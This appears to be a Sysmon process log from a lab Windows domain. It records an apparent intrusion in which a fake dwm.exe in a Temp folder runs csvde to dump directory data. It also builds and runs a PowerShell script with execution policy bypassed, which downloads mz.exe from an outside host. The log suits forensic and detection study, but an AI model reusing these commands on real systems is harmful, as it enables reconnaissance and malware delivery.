情報,2019/11/07 15:23:50,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:23:50.676
ProcessGuid: {CC41BF7E-5176-5A01-0000-0010E46F2000}
ProcessId: 4448
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:5168 CREDAT:140545 /prefetch:2
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=B2533AE4CDAA5F2B0B38A76B8EB65F12C7B225EC
ParentProcessGuid: {CC41BF7E-5176-5A01-0000-001067652000}
ParentProcessId: 5168
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:23:50,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:23:50.534
ProcessGuid: {CC41BF7E-5176-5A01-0000-001067652000}
ProcessId: 5168
Image: C:\Program Files\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=F0FEB5350BD497A9E9BF77ED072315E64ABFFA33
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:22:58,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:22:58.852
ProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ProcessId: 1968
Image: C:\Program Files\Windows Defender\MsMpEng.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:22:58,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:22:58.712
ProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ProcessId: 1968
Image: C:\Program Files\Windows Defender\MsMpEng.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:22:58,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:22:58.618
ProcessGuid: {CC41BF7E-5142-5A01-0000-0010354E2000}
ProcessId: 4780
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:22:58,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:22:58.593
ProcessGuid: {CC41BF7E-5142-5A01-0000-0010354E2000}
ProcessId: 4780
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" GetDeviceTicket -AccessKey 15BC12AF-942E-E5F2-A846-C3E2504B5E1C 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:22:57,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:22:57.241
ProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ProcessId: 1968
Image: C:\Program Files\Windows Defender\MsMpEng.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:22:57,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:22:57.147
ProcessGuid: {CC41BF7E-5141-5A01-0000-0010883B2000}
ProcessId: 4564
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:22:57,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:22:57.122
ProcessGuid: {CC41BF7E-5141-5A01-0000-0010883B2000}
ProcessId: 4564
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" GetDeviceTicket -AccessKey 7DEFB293-500D-01CE-7B2E-0D8FF7908E96 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:22:56,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:22:56.929
ProcessGuid: {CC41BF7E-513B-5A01-0000-00102F172000}
ProcessId: 5696
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:22:56,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:22:56.913
ProcessGuid: {CC41BF7E-513B-5A01-0000-0010BE162000}
ProcessId: 5692
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:22:56,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:22:56.913
ProcessGuid: {CC41BF7E-513B-5A01-0000-00101E192000}
ProcessId: 2472
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
情報,2019/11/07 15:22:56,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:22:56.835
ProcessGuid: {CC41BF7E-5140-5A01-0000-001063342000}
ProcessId: 4208
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:22:56,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:22:56.798
ProcessGuid: {CC41BF7E-5140-5A01-0000-001063342000}
ProcessId: 4208
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" GetDeviceTicket -AccessKey 44699EC9-9E8F-E011-CBD5-63CFE33620AD 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:22:51,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:22:51.955
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:22:51,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:22:51.955
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:22:51,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:22:51.960
ProcessGuid: {CC41BF7E-513B-5A01-0000-00101E192000}
ProcessId: 2472
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell  -ExecutionPolicy ByPass -File C:\Intel\Logs\z.ps1
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A9D3B2DED5EC2DA6C8F48F795437469961D3A225
ParentProcessGuid: {CC41BF7E-513B-5A01-0000-0010BE162000}
ParentProcessId: 5692
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""powershell -ExecutionPolicy ByPass -File C:\Intel\Logs\z.ps1"""
情報,2019/11/07 15:22:51,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:22:51.918
ProcessGuid: {CC41BF7E-513B-5A01-0000-00102F172000}
ProcessId: 5696
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-513B-5A01-0000-0010BE162000}
ParentProcessId: 5692
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""powershell -ExecutionPolicy ByPass -File C:\Intel\Logs\z.ps1"""
情報,2019/11/07 15:22:51,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:22:51.913
ProcessGuid: {CC41BF7E-513B-5A01-0000-0010BE162000}
ProcessId: 5692
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""powershell -ExecutionPolicy ByPass -File C:\Intel\Logs\z.ps1""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:22:50,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:22:50.735
ProcessGuid: {CC41BF7E-513A-5A01-0000-0010710C2000}
ProcessId: 4572
Image: C:\Windows\System32\taskhostw.exe"
情報,2019/11/07 15:22:50,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:22:50.683
ProcessGuid: {CC41BF7E-513A-5A01-0000-0010710C2000}
ProcessId: 4572
Image: C:\Windows\System32\taskhostw.exe
CommandLine: taskhostw.exe
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=9CC394E9F9AEF58F7BDB90B8B19559AB6605CB64
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:22:48,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:22:48.498
ProcessGuid: {CC41BF7E-512D-5A01-0000-00101FCD1F00}
ProcessId: 5884
Image: C:\Program Files\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:22:48,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:22:48.451
ProcessGuid: {CC41BF7E-512D-5A01-0000-0010BFD71F00}
ProcessId: 4712
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:22:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:22:37.604
ProcessGuid: {CC41BF7E-512D-5A01-0000-0010BFD71F00}
ProcessId: 4712
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:5884 CREDAT:140545 /prefetch:2
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=B2533AE4CDAA5F2B0B38A76B8EB65F12C7B225EC
ParentProcessGuid: {CC41BF7E-512D-5A01-0000-00101FCD1F00}
ParentProcessId: 5884
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:22:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:22:37.459
ProcessGuid: {CC41BF7E-512D-5A01-0000-00101FCD1F00}
ProcessId: 5884
Image: C:\Program Files\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=F0FEB5350BD497A9E9BF77ED072315E64ABFFA33
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:22:35,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:22:35.797
ProcessGuid: {CC41BF7E-512B-5A01-0000-001005BE1F00}
ProcessId: 3760
Image: C:\Windows\System32\taskhostw.exe"
情報,2019/11/07 15:22:35,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:22:35.703
ProcessGuid: {CC41BF7E-512B-5A01-0000-001005BE1F00}
ProcessId: 3760
Image: C:\Windows\System32\taskhostw.exe
CommandLine: taskhostw.exe
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=9CC394E9F9AEF58F7BDB90B8B19559AB6605CB64
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:22:25,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:22:25.928
ProcessGuid: {CC41BF7E-5121-5A01-0000-0010FAB71F00}
ProcessId: 4292
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:22:25,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:22:25.912
ProcessGuid: {CC41BF7E-5121-5A01-0000-00107EB71F00}
ProcessId: 3144
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:22:25,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:22:25.880
ProcessGuid: {CC41BF7E-5121-5A01-0000-0010FAB71F00}
ProcessId: 4292
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-5121-5A01-0000-00107EB71F00}
ParentProcessId: 3144
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""echo $p.DownloadFile(""http://anews-web.co/mz.exe"", ""C:\Intel\Logs\mz.exe"") >> C:\Intel\Logs\z.ps1"""
情報,2019/11/07 15:22:25,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:22:25.875
ProcessGuid: {CC41BF7E-5121-5A01-0000-00107EB71F00}
ProcessId: 3144
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""echo $p.DownloadFile(""http://anews-web.co/mz.exe"", ""C:\Intel\Logs\mz.exe"") >> C:\Intel\Logs\z.ps1""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:22:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:22:16.450
ProcessGuid: {CC41BF7E-510D-5A01-0000-001084771F00}
ProcessId: 2752
Image: C:\Program Files\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:22:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:22:16.419
ProcessGuid: {CC41BF7E-510D-5A01-0000-0010B0811F00}
ProcessId: 1488
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:22:05,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:22:05.354
ProcessGuid: {CC41BF7E-510D-5A01-0000-0010B0811F00}
ProcessId: 1488
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:2752 CREDAT:140545 /prefetch:2
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=B2533AE4CDAA5F2B0B38A76B8EB65F12C7B225EC
ParentProcessGuid: {CC41BF7E-510D-5A01-0000-001084771F00}
ParentProcessId: 2752
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:22:05,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:22:05.223
ProcessGuid: {CC41BF7E-510D-5A01-0000-001084771F00}
ProcessId: 2752
Image: C:\Program Files\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=F0FEB5350BD497A9E9BF77ED072315E64ABFFA33
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:22:00,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:22:00.918
ProcessGuid: {CC41BF7E-5108-5A01-0000-00106C711F00}
ProcessId: 1376
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:22:00,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:22:00.902
ProcessGuid: {CC41BF7E-5108-5A01-0000-0010FB701F00}
ProcessId: 5516
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:22:00,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:22:00.867
ProcessGuid: {CC41BF7E-5108-5A01-0000-00106C711F00}
ProcessId: 1376
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-5108-5A01-0000-0010FB701F00}
ParentProcessId: 5516
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""echo $p = New-Object System.Net.WebClient > C:\Intel\Logs\z.ps1"""
情報,2019/11/07 15:22:00,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:22:00.861
ProcessGuid: {CC41BF7E-5108-5A01-0000-0010FB701F00}
ProcessId: 5516
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""echo $p = New-Object System.Net.WebClient > C:\Intel\Logs\z.ps1""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:21:37,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:21:37.816
ProcessGuid: {CC41BF7E-50F0-5A01-0000-0010066A1F00}
ProcessId: 5600
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:21:37,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:21:37.816
ProcessGuid: {CC41BF7E-50F0-5A01-0000-001095691F00}
ProcessId: 5336
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:21:36,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:21:36.842
ProcessGuid: {CC41BF7E-50F0-5A01-0000-0010066A1F00}
ProcessId: 5600
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-50F0-5A01-0000-001095691F00}
ParentProcessId: 5336
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""type C:\Intel\Logs\l.txt"""
情報,2019/11/07 15:21:36,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:21:36.836
ProcessGuid: {CC41BF7E-50F0-5A01-0000-001095691F00}
ProcessId: 5336
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""type C:\Intel\Logs\l.txt""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:21:30,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:21:30.453
ProcessGuid: {CC41BF7E-5070-5A01-0000-00100C8C1C00}
ProcessId: 5232
Image: C:\Windows\servicing\TrustedInstaller.exe"
情報,2019/11/07 15:21:30,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:21:30.453
ProcessGuid: {CC41BF7E-5071-5A01-0000-00105D971C00}
ProcessId: 1384
Image: C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.14393.0_none_36d3ccc3ddfd1ecb\TiWorker.exe"
情報,2019/11/07 15:21:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:21:16.968
ProcessGuid: {CC41BF7E-50DB-5A01-0000-0010C1601F00}
ProcessId: 2648
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:21:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:21:16.968
ProcessGuid: {CC41BF7E-50DB-5A01-0000-001050601F00}
ProcessId: 5200
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:21:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:21:16.968
ProcessGuid: {CC41BF7E-50DB-5A01-0000-0010C0621F00}
ProcessId: 6012
Image: C:\Intel\Logs\csvde.exe"
情報,2019/11/07 15:21:15,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:21:15.843
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:21:15,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:21:15.843
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:21:15,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:21:15.839
ProcessGuid: {CC41BF7E-50DB-5A01-0000-0010C0621F00}
ProcessId: 6012
Image: C:\Intel\Logs\csvde.exe
CommandLine: C:\Intel\Logs\csvde.exe  -f C:\Intel\Logs\l.txt
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=3F0610183464F8B2F50D7D9824B7B60D60A90060
ParentProcessGuid: {CC41BF7E-50DB-5A01-0000-001050601F00}
ParentProcessId: 5200
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\csvde.exe -f C:\Intel\Logs\l.txt"""
